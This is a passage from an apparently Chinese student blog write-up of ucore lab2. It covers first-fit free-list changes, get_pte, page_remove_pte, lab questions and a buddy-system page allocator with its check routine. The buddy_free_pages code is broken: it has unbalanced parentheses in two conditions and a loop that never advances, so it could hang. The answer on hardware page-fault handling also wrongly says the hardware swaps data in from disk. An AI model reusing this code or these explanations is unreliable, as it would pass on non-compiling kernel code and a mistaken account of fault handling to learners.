<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    list_del(&amp;(page-&gt;page_link));</span><br><span class="line">    <span class="keyword">if</span> (page-&gt;property &gt; n) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">page</span> + <span class="title">n</span>;</span></span><br><span class="line">        p-&gt;property = page-&gt;property - n;</span><br><span class="line">        <span class="comment">// 注意这一步</span></span><br><span class="line">        list_add(&amp;free_list, &amp;(p-&gt;page_link));</span><br><span class="line">    &#125;</span><br><span class="line">    nr_free -= n;</span><br><span class="line">    ClearPageProperty(page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以下是修改后的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (page-&gt;property &gt; n) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">page</span> + <span class="title">n</span>;</span></span><br><span class="line">        p-&gt;property = page-&gt;property - n;</span><br><span class="line">        SetPageProperty(p);</span><br><span class="line">        <span class="comment">// 注意这一步add after</span></span><br><span class="line">        list_add_after(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));</span><br><span class="line">    &#125;</span><br><span class="line">    list_del(&amp;(page-&gt;page_link));</span><br><span class="line">    nr_free -= n;</span><br><span class="line">    ClearPageProperty(page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>default_free_pages</code></p>
<ul>
<li>
<p>该函数默认会在函数末尾处，将待释放的页头插入至链表的第一个节点。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">list_add(&amp;free_list, &amp;(base-&gt;page_link));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>所以我们需要修改这部分代码，使其按地址顺序插入至对应的链表结点处。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将空闲页面按地址大小插入至链表中</span></span><br><span class="line"><span class="keyword">for</span>(le = list_next(&amp;free_list); le != &amp;free_list; le = list_next(le))</span><br><span class="line">&#123;</span><br><span class="line">    p = le2page(le, page_link);</span><br><span class="line">    <span class="keyword">if</span> (base + base-&gt;property &lt;= p) &#123;</span><br><span class="line">        assert(base + base-&gt;property != p);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">list_add_before(le, &amp;(base-&gt;page_link));</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="3-练习2">3) 练习2</h3>
<blockquote>
<p><strong>实现寻找虚拟地址对应的页表项</strong>.</p>
</blockquote>
<blockquote>
<p>通过设置页表和对应的页表项，可建立虚拟内存地址和物理内存地址的对应关系。</p>
<p>其中的<code>get_pte</code>函数是设置页表项环节中的一个重要步骤。此函数找到一个虚地址对应的二级页表项的内核虚地址，如果此二级页表项不存在，则分配一个包含此项的二级页表。</p>
</blockquote>
<p>以下为实现的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pte_t</span> * <span class="title">get_pte</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">bool</span> create)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取传入的线性地址中所对应的页目录条目的物理地址</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pdep = &amp;pgdir[PDX(la)];</span><br><span class="line">    <span class="comment">// 如果该条目不可用(not present)</span></span><br><span class="line">    <span class="keyword">if</span> (!(*pdep &amp; PTE_P)) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">        <span class="comment">// 如果分配页面失败，或者不允许分配，则返回NULL</span></span><br><span class="line">        <span class="keyword">if</span> (!create || (page = alloc_page()) == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">// 设置该物理页面的引用次数为1</span></span><br><span class="line">        set_page_ref(page, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 获取当前物理页面所管理的物理地址</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pa = page2pa(page);</span><br><span class="line">        <span class="comment">// 清空该物理页面的数据。需要注意的是使用虚拟地址</span></span><br><span class="line">        <span class="built_in">memset</span>(KADDR(pa), <span class="number">0</span>, PGSIZE);</span><br><span class="line">        <span class="comment">// 将新分配的页面设置为当前缺失的页目录条目中</span></span><br><span class="line">        <span class="comment">// 之后该页面就是其中的一个二级页面</span></span><br><span class="line">        *pdep = pa | PTE_U | PTE_W | PTE_P;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回在pgdir中对应于la的二级页表项</span></span><br><span class="line">    <span class="keyword">return</span> &amp;((<span class="keyword">pte_t</span> *)KADDR(PDE_ADDR(*pdep)))[PTX(la)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>请描述页目录项（Pag Director Entry）和页表（Page Table Entry）中每个组成部分的含义和以及对ucore而言的潜在用处。</p>
<blockquote>
<p>请查看<a href="#d-%E8%99%9A%E6%8B%9F%E9%A1%B5%E8%A1%A8%E7%BB%93%E6%9E%84">虚拟页表结构</a></p>
</blockquote>
</li>
<li>
<p>如果ucore执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？</p>
<blockquote>
<p>以下答案参考了其他blog，具体细节留待以后再来研究。</p>
</blockquote>
<ul>
<li>将引发页访问异常的地址将被保存在cr2寄存器中</li>
<li>设置错误代码</li>
<li>引发Page Fault，将外存的数据换到内存中</li>
<li>进行上下文切换，退出中断，返回到中断前的状态</li>
</ul>
</li>
</ul>
<h3 id="4-练习3">4) 练习3</h3>
<blockquote>
<p><strong>释放某虚地址所在的页并取消对应二级页表项的映射</strong>.</p>
</blockquote>
<blockquote>
<p>当释放一个包含某虚地址的物理内存页时，需要让对应此物理内存页的管理数据结构Page做相关的清除处理，使得此物理内存页成为空闲；另外还需把表示虚地址与物理地址对应关系的二级页表项清除。</p>
</blockquote>
<p>这个练习不是很难，对着注释完成即可。以下为实现的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//page_remove_pte - free an Page sturct which is related linear address la</span></span><br><span class="line"><span class="comment">//                - and clean(invalidate) pte which is related linear address la</span></span><br><span class="line"><span class="comment">//note: PT is changed, so the TLB need to be invalidate</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">page_remove_pte(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">pte_t</span> *ptep) &#123;</span><br><span class="line">    <span class="comment">// 如果传入的页表条目是可用的</span></span><br><span class="line">    <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123;</span><br><span class="line">        <span class="comment">// 获取该页表条目所对应的地址</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">pte2page</span>(*<span class="title">ptep</span>);</span></span><br><span class="line">        <span class="comment">// 如果该页的引用次数在减1后为0</span></span><br><span class="line">        <span class="keyword">if</span> (page_ref_dec(page) == <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 释放当前页</span></span><br><span class="line">            free_page(page);</span><br><span class="line">        <span class="comment">// 清空PTE</span></span><br><span class="line">        *ptep = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 刷新TLB内的数据</span></span><br><span class="line">        tlb_invalidate(pgdir, la);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>数据结构Page的全局变量（其实是一个数组）的每一项与页表中的页目录项和页表项有无对应关系？如果有，其对应关系是啥？</p>
<ul>
<li>
<p>当页目录项或页表项有效时，Page数组中的项与页目录项或页表项存在对应关系。</p>
</li>
<li>
<p>页目录表中存放着数个页表条目PTE，这些页表条目中存放了某个二级页表所在物理页的信息，包括该二级页表的<strong>物理地址</strong>，但使用<strong>线性地址</strong>的头部PDX(Page Directory Index)来索引页目录表。</p>
<blockquote>
<p>总结一下，页目录表内存放二级页表的<strong>物理地址</strong>，但却使用<strong>线性地址</strong>索引页目录表中的条目。</p>
</blockquote>
</li>
<li>
<p>而页表（二级页表）与页目录（一级页表）具有类似的特性，页表中的页表项指向所管理的物理页的<strong>物理地址</strong>（不是数据结构Page的地址），使用线性地址的中部PTX(Page Table Index)来索引页表。</p>
</li>
<li>
<p>当二级页表获取物理页时，需要对该物理页所对应的数据结构page来做一些操作。其操作包括但不限于设置引用次数，这样方便共享内存。</p>
</li>
</ul>
<blockquote>
<p>为什么页目录表中存放的是<strong>物理</strong>地址呢？可能是为了防止递归查找。</p>
<p>即原先查找页目录表的目的是想将某个线性地址转换为物理地址，但如果页目录表中存放的是二级页表的<strong>线性</strong>地址，则需要先查找该二级页表的物理地址，此时需要递归查找，这可能会出现永远也查找不到物理地址的情况。</p>
</blockquote>
</li>
<li>
<p>如果希望虚拟地址与物理地址相等，则需要如何修改lab2，完成此事？ <strong>鼓励通过编程来具体完成这个问题</strong></p>
<ul>
<li>
<p>将<code>labcodes/lab2/tools/kernel.ld</code>中的加载地址从<code>0xC0100000</code>修改为<code>0x0</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改前</span></span><br><span class="line">. = <span class="number">0xC0100000</span>;</span><br><span class="line"><span class="comment">// 修改后</span></span><br><span class="line">. = <span class="number">0x0</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将<code>mm/</code>中的内核偏移地址修改为0</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改前</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNBASE            0xC0000000</span></span><br><span class="line"><span class="comment">// 修改后</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNBASE            0x0</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最后一步，但也是必须要做的一步——<strong>关闭页机制</strong>。将开启页机制的那一段代码删除或注释掉最后一句即可。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"># 修改后</span><br><span class="line">movl %cr0, %eax</span><br><span class="line">orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax</span><br><span class="line">andl $~(CR0_TS | CR0_EM), %eax</span><br><span class="line"># 注释了最后一句</span><br><span class="line"># movl %eax, %cr0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为什么要关闭页机制？只将偏移地址设置为0不够么？这是个值得探讨的问题。</p>
<p>注意到<code>kern/init.entry.S</code>中有这样一段代码</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">next:</span></span><br><span class="line">  # unmap va <span class="number">0</span> ~ 4M, it<span class="string">'s temporary mapping</span></span><br><span class="line"><span class="string">  xorl %eax, %eax</span></span><br><span class="line"><span class="string">  movl %eax, __boot_pgdir</span></span><br></pre></td></tr></table></figure>
<p>当CPU完成了<code>eip</code>的地址更新后，这两条指令会删除页目录表中的一个<strong>临时</strong>映射（va 0 ~ 4M to pa 0 ~ 4M）</p>
<p>但一旦删除了这个临时映射后，CPU无法正常寻址，即便页目录表中还有一个映射（va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M， 注意KERNBASE为0）</p>
<p>但只要基地址不为0，则不会出错。</p>
<p>具体的问题在哪呢？或许，需要查询一下intel 80386的相关手册。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="5-扩展练习">5) 扩展练习</h3>
<h4 id="Challenge1">Challenge1</h4>
<blockquote>
<p><strong>buddy system（伙伴系统）分配算法</strong></p>
<p>Buddy System算法把系统中的可用存储空间划分为存储块(Block)来进行管理, 每个存储块的大小必须是2的n次幂(Pow(2, n)), 即1, 2, 4, 8, 16, 32, 64, 128…</p>
</blockquote>
<h5 id="a-前置准备">a. 前置准备</h5>
<p>伙伴系统中每个存储块的大小都必须是2的n次幂，所以其中必须有个<strong>可以将传入数转换为最接近该数的2的n次幂</strong>的函数，相关代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传入一个数，返回最接近该数的2的指数（包括该数为2的整数这种情况）</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">getLessNearOfPower2</span><span class="params">(<span class="keyword">size_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> _i;</span><br><span class="line">    <span class="keyword">for</span>(_i = <span class="number">0</span>; _i &lt; <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">8</span> - <span class="number">1</span>; _i++)</span><br><span class="line">        <span class="keyword">if</span>((<span class="number">1</span> &lt;&lt; (_i+<span class="number">1</span>)) &gt; x)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">size_t</span>)(<span class="number">1</span> &lt;&lt; _i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="b-初始化">b. 初始化</h5>
<p>初始时，程序会多次将一块尺寸很大的物理内存空间传入<code>init_memmap</code>函数，但该物理内存空间的大小却不一定是2的n次幂，所以需要对其进行分割。设定分割后的内存布局如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">buddy system中的内存布局</span></span><br><span class="line"><span class="comment">      某块较大的物理空间</span></span><br><span class="line"><span class="comment">低地址                              高地址</span></span><br><span class="line"><span class="comment">+-+--+----+--------+-------------------+</span></span><br><span class="line"><span class="comment">| |  |    |        |                   |</span></span><br><span class="line"><span class="comment">+-+--+----+--------+-------------------+</span></span><br><span class="line"><span class="comment">低地址的内存块较小             高地址的内存块较大</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>同时，在双向链表<code>free_area.free_list</code>中，令空间较小的内存块在双向链表中靠前，空间较大的内存块在双向链表中靠后；低地址在前，高地址在后。故以下是最终的链表布局：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">free_area.free_list中的内存块顺序:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1. 一大块连续物理内存被切割后，free_area.free_list中的内存块顺序</span></span><br><span class="line"><span class="comment">    addr: 0x34       0x38           0x40</span></span><br><span class="line"><span class="comment">        +----+     +--------+     +---------------+</span></span><br><span class="line"><span class="comment">    &lt;-&gt; | 0x4| &lt;-&gt; | 0x8    | &lt;-&gt; |     0x10      | &lt;-&gt;</span></span><br><span class="line"><span class="comment">        +----+     +--------+     +---------------+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2. 几大块物理内存（这几块之间可能不连续）被切割后，free_area.free_list中的内存块顺序</span></span><br><span class="line"><span class="comment">    addr: 0x34       0x104       0x38           0x108          0x40                 0x110</span></span><br><span class="line"><span class="comment">        +----+     +----+     +--------+     +--------+     +---------------+     +---------------+</span></span><br><span class="line"><span class="comment">    &lt;-&gt; | 0x4| &lt;-&gt; | 0x4| &lt;-&gt; | 0x8    | &lt;-&gt; | 0x8    | &lt;-&gt; |     0x10      | &lt;-&gt; |     0x10      | &lt;-&gt;</span></span><br><span class="line"><span class="comment">        +----+     +----+     +--------+     +--------+     +---------------+     +---------------+</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>根据上面的内存规划，可以得到<code>buddy_init_memmap</code>的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">buddy_init_memmap(struct Page *base, <span class="keyword">size_t</span> n) &#123;</span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置当前页向后的curr_n个页</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">base</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (; p != base + n; p ++) &#123;</span><br><span class="line">        assert(PageReserved(p));</span><br><span class="line">        p-&gt;flags = p-&gt;property = <span class="number">0</span>;</span><br><span class="line">        set_page_ref(p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置总共的空闲内存页面</span></span><br><span class="line">    nr_free += n;</span><br><span class="line">    <span class="comment">// 设置base指向尚未处理内存的end地址</span></span><br><span class="line">    base += n;</span><br><span class="line">    <span class="keyword">while</span>(n != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> curr_n = getLessNearOfPower2(n);</span><br><span class="line">        <span class="comment">// 向前挪一块</span></span><br><span class="line">        base -= curr_n;</span><br><span class="line">        <span class="comment">// 设置free pages的数量</span></span><br><span class="line">        base-&gt;property = curr_n;</span><br><span class="line">        <span class="comment">// 设置当前页为可用</span></span><br><span class="line">        SetPageProperty(base);</span><br><span class="line">        <span class="comment">// 按照块的大小来插入空闲块，从小到大排序</span></span><br><span class="line">        <span class="comment">// @note 这里必须使用搜索的方式来插入块而不是直接list_add_after(&amp;free_list)，因为存在大的内存块不相邻的情况</span></span><br><span class="line">        <span class="keyword">list_entry_t</span>* le;</span><br><span class="line">        <span class="keyword">for</span>(le = list_next(&amp;free_list); le != &amp;free_list; le = list_next(le))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">page_link</span>);</span></span><br><span class="line">            <span class="comment">// 排序方式以内存块大小优先，地址其次。</span></span><br><span class="line">            <span class="keyword">if</span>((p-&gt;property &gt; base-&gt;property)</span><br><span class="line">                 || (p-&gt;property ==  base-&gt;property &amp;&amp; p &gt; base))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        list_add_before(le, &amp;(base-&gt;page_link));</span><br><span class="line">        n -= curr_n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="c-空间分配">c. 空间分配</h5>
<p>分配空间时，遍历双向链表，查找大小合适的内存块。</p>
<ul>
<li>
<p>若链表中不存在合适大小的内存块，则<strong>对半切割</strong>遍历过程中遇到的第一块大小大于所需空间的内存块。</p>
</li>
<li>
<p>如果切割后的两块内存块的大小还是太大，则继续切割<strong>第一块</strong>内存块。</p>
</li>
<li>
<p>循环该操作，直至切割出合适大小的内存块。</p>
</li>
<li>
<p>最终<code>buddy_alloc_pages</code>代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *</span></span><br><span class="line"><span class="class"><span class="title">buddy_alloc_pages</span>(<span class="title">size_t</span> <span class="title">n</span>) &#123;</span></span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 向上取2的幂次方，如果当前数为2的幂次方则不变</span></span><br><span class="line">    <span class="keyword">size_t</span> lessOfPower2 = getLessNearOfPower2(n);</span><br><span class="line">    <span class="keyword">if</span> (lessOfPower2 &lt; n)</span><br><span class="line">        n = <span class="number">2</span> * lessOfPower2;</span><br><span class="line">    <span class="comment">// 如果待分配的空闲页面数量小于所需的内存数量</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt; nr_free) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找符合要求的连续页</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = &amp;free_list;</span><br><span class="line">    <span class="keyword">while</span> ((le = list_next(le)) != &amp;free_list) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">page_link</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;property &gt;= n) &#123;</span><br><span class="line">            page = p;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果需要切割内存块时，一定分配切割后的前面那块</span></span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果内存块过大，则持续切割内存</span></span><br><span class="line">        <span class="keyword">while</span>(page-&gt;property &gt; n)</span><br><span class="line">        &#123;</span><br><span class="line">            page-&gt;property /= <span class="number">2</span>;</span><br><span class="line">            <span class="comment">// 切割出的右边那一半内存块不用于内存分配</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">page</span> + <span class="title">page</span>-&gt;<span class="title">property</span>;</span></span><br><span class="line">            p-&gt;property = page-&gt;property;</span><br><span class="line">            SetPageProperty(p);</span><br><span class="line">            list_add_after(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));</span><br><span class="line">        &#125;</span><br><span class="line">        nr_free -= n;</span><br><span class="line">        ClearPageProperty(page);</span><br><span class="line">        assert(page-&gt;property == n);</span><br><span class="line">        list_del(&amp;(page-&gt;page_link));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="d-内存释放">d. 内存释放</h5>
<p>释放内存时</p>
<ul>
<li>
<p>先将该内存块按照<strong>内存块大小从小到大与内存块地址从小到大</strong>的顺序插入至双向链表（具体请看上面的链表布局）。</p>
</li>
<li>
<p>尝试向前合并，一次就够。如果向前合并成功，则一定不能再次向前合并。</p>
</li>
<li>
<p>之后循环向后合并，直至无法合并。</p>
<blockquote>
<p>需要注意的是，在查找两块内存块能否合并时，若当前内存块合并过，则其大小会变为原来的2倍，此时需要遍历比原始大小（合并前内存块大小）更大的内存块。</p>
</blockquote>
</li>
<li>
<p>判断当前内存块的位置是否正常，如果不正常，则需要断开链表并重新插入至新的位置。</p>
<blockquote>
<p>如果当前内存块没有合并则肯定正常，如果合并过则<strong>不一定异常</strong>。</p>
</blockquote>
</li>
<li>
<p>最终代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">buddy_free_pages(struct Page *base, <span class="keyword">size_t</span> n) &#123;</span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 向上取2的幂次方，如果当前数为2的幂次方则不变</span></span><br><span class="line">    <span class="keyword">size_t</span> lessOfPower2 = getLessNearOfPower2(n);</span><br><span class="line">    <span class="keyword">if</span> (lessOfPower2 &lt; n)</span><br><span class="line">        n = <span class="number">2</span> * lessOfPower2;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">base</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (; p != base + n; p ++) &#123;</span><br><span class="line">        assert(!PageReserved(p) &amp;&amp; !PageProperty(p));</span><br><span class="line">        p-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        set_page_ref(p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    base-&gt;property = n;</span><br><span class="line">    SetPageProperty(base);</span><br><span class="line">    nr_free += n;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le;</span><br><span class="line">    <span class="comment">// 先插入至链表中</span></span><br><span class="line">    <span class="keyword">for</span>(le = list_next(&amp;free_list); le != &amp;free_list; le = list_next(le))</span><br><span class="line">    &#123;</span><br><span class="line">        p = le2page(le, page_link);</span><br><span class="line">        <span class="keyword">if</span> ((base-&gt;property &lt;= p-&gt;property)</span><br><span class="line">                 || (p-&gt;property ==  base-&gt;property &amp;&amp; p &gt; base))) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    list_add_before(le, &amp;(base-&gt;page_link));</span><br><span class="line">    <span class="comment">// 先向左合并</span></span><br><span class="line">    <span class="keyword">if</span>(base-&gt;property == p-&gt;property &amp;&amp; p + p-&gt;property == base) &#123;</span><br><span class="line">        p-&gt;property += base-&gt;property;</span><br><span class="line">        ClearPageProperty(base);</span><br><span class="line">        list_del(&amp;(base-&gt;page_link));</span><br><span class="line">        base = p;</span><br><span class="line">        le = &amp;(base-&gt;page_link);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 之后循环向后合并</span></span><br><span class="line">    <span class="comment">// 此时的le指向插入块的下一个块</span></span><br><span class="line">    <span class="keyword">while</span> (le != &amp;free_list) &#123;</span><br><span class="line">        p = le2page(le, page_link);</span><br><span class="line">        <span class="comment">// 如果可以合并(大小相等+地址相邻),则合并</span></span><br><span class="line">        <span class="comment">// 如果两个块的大小相同，则它们不一定内存相邻。</span></span><br><span class="line">        <span class="comment">// 也就是说，在一条链上，可能存在多个大小相等但却无法合并的块</span></span><br><span class="line">        <span class="keyword">if</span> (base-&gt;property == p-&gt;property &amp;&amp; base + base-&gt;property == p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 向右合并</span></span><br><span class="line">            base-&gt;property += p-&gt;property;</span><br><span class="line">            ClearPageProperty(p);</span><br><span class="line">            list_del(&amp;(p-&gt;page_link));</span><br><span class="line">            le = &amp;(base-&gt;page_link);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果遍历到的内存块一定无法合并，则退出</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(base-&gt;property &lt; p-&gt;property)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果合并不了，则需要修改base在链表中的位置，使大小相同的聚在一起</span></span><br><span class="line">            <span class="keyword">list_entry_t</span>* targetLe = list_next(&amp;base-&gt;page_link);</span><br><span class="line">            p = le2page(targetLe, page_link);</span><br><span class="line">            <span class="keyword">while</span>(p-&gt;property &lt; base-&gt;property)</span><br><span class="line">                 || (p-&gt;property ==  base-&gt;property &amp;&amp; p &gt; base))</span><br><span class="line">                targetLe = list_next(targetLe);</span><br><span class="line">            <span class="comment">// 如果当前内存块的位置不正确，则重置位置</span></span><br><span class="line">            <span class="keyword">if</span>(targetLe != list_next(&amp;base-&gt;page_link))</span><br><span class="line">            &#123;</span><br><span class="line">                list_del(&amp;(base-&gt;page_link));</span><br><span class="line">                list_add_before(targetLe, &amp;(base-&gt;page_link));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 最后退出</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        le = list_next(le);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="5-算法检查">5. 算法检查</h5>
<p><code>buddy_check</code>是一个不能忽视的检查函数，该函数可以帮助查找出程序内部隐藏的bug。笔者将其中原本用于检查<code>FIFO</code>算法的内容修改成检查<code>buddySystem</code>的内容。所修改的内容如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//.........................................................</span></span><br><span class="line"><span class="comment">// 先释放</span></span><br><span class="line">free_pages(p0, <span class="number">26</span>);     <span class="comment">// 32+  (-:已分配 +: 已释放)</span></span><br><span class="line"><span class="comment">// 首先检查是否对齐2</span></span><br><span class="line">p0 = alloc_pages(<span class="number">6</span>);    <span class="comment">// 8- 8+ 16+</span></span><br><span class="line">p1 = alloc_pages(<span class="number">10</span>);   <span class="comment">// 8- 8+ 16-</span></span><br><span class="line">assert((p0 + <span class="number">8</span>)-&gt;property == <span class="number">8</span>);</span><br><span class="line">free_pages(p1, <span class="number">10</span>);     <span class="comment">// 8- 8+ 16+</span></span><br><span class="line">assert((p0 + <span class="number">8</span>)-&gt;property == <span class="number">8</span>);</span><br><span class="line">assert(p1-&gt;property == <span class="number">16</span>);</span><br><span class="line">p1 = alloc_pages(<span class="number">16</span>);   <span class="comment">// 8- 8+ 16-</span></span><br><span class="line"><span class="comment">// 之后检查合并</span></span><br><span class="line">free_pages(p0, <span class="number">6</span>);      <span class="comment">// 16+ 16-</span></span><br><span class="line">assert(p0-&gt;property == <span class="number">16</span>);</span><br><span class="line">free_pages(p1, <span class="number">16</span>);     <span class="comment">// 32+</span></span><br><span class="line">assert(p0-&gt;property == <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">p0 = alloc_pages(<span class="number">8</span>);    <span class="comment">// 8- 8+ 16+</span></span><br><span class="line">p1 = alloc_pages(<span class="number">9</span>);    <span class="comment">// 8- 8+ 16-</span></span><br><span class="line">free_pages(p1, <span class="number">9</span>);     <span class="comment">// 8- 8+ 16+</span></span><br><span class="line">assert(p1-&gt;property == <span class="number">16</span>);</span><br><span class="line">assert((p0 + <span class="number">8</span>)-&gt;property == <span class="number">8</span>);</span><br><span class="line">free_pages(p0, <span class="number">8</span>);      <span class="comment">// 